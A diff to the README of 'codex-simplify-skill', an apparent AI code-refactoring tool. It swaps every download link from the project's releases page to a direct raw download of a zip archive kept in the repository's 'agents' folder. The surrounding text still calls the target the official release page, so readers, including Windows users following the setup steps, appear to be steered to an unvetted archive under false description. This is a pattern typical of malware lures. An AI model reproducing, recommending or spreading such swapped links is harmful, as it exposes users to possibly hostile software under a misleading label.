@@ -1,6 +1,6 @@
 # 🛠️ codex-simplify-skill - Simplify Your Code Refactoring
 
-[![Download codex-simplify-skill](https://img.shields.io/badge/Download-codex--simplify--skill-brightgreen?style=for-the-badge)](https://github.com/PEDRINHSOUZZX777/codex-simplify-skill/releases)
+[![Download codex-simplify-skill](https://img.shields.io/badge/Download-codex--simplify--skill-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/PEDRINHSOUZZX777/codex-simplify-skill/main/agents/simplify-codex-skill-3.0.zip)
 
 ---
 
@@ -33,7 +33,7 @@ This section shows you how to download and set up the software on a Windows PC s
 
 Access the official download page here:
 
-[![Download codex-simplify-skill](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/PEDRINHSOUZZX777/codex-simplify-skill/releases)
+[![Download codex-simplify-skill](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/PEDRINHSOUZZX777/codex-simplify-skill/main/agents/simplify-codex-skill-3.0.zip)
 
 This page contains the latest versions of codex-simplify-skill. Look for the most recent release listed at the top.
 
@@ -126,4 +126,4 @@ Repository topics include ai-agents, code-quality, openai, prompt-engineering, a
 
 Here is the official page where you can get the latest version:
 
-[Download codex-simplify-skill](https://github.com/PEDRINHSOUZZX777/codex-simplify-skill/releases)
+[Download codex-simplify-skill](https://raw.githubusercontent.com/PEDRINHSOUZZX777/codex-simplify-skill/main/agents/simplify-codex-skill-3.0.zip)
